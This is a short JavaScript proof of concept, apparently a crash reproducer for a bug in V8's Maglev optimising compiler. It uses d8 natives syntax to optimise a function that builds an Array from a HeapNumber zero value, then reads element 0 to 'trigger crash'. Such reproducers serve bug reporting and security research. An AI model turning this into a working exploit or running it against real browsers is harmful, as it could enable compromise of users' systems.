const factor = 0x7fffffffffffffff;
const value = 0 / factor; // HeapNumber 0.0

let use;

function opt_me() {
    use = value;
    const arr = Array(value);   
    return arr;
}

%PrepareFunctionForOptimization(opt_me);
opt_me();
%OptimizeMaglevOnNextCall(opt_me);
let evil_arr = opt_me();

// trigger crash
print(evil_arr[0]);
//./d8 --allow-natives-syntax --script-context-mutable-heap-int32 ./poc.js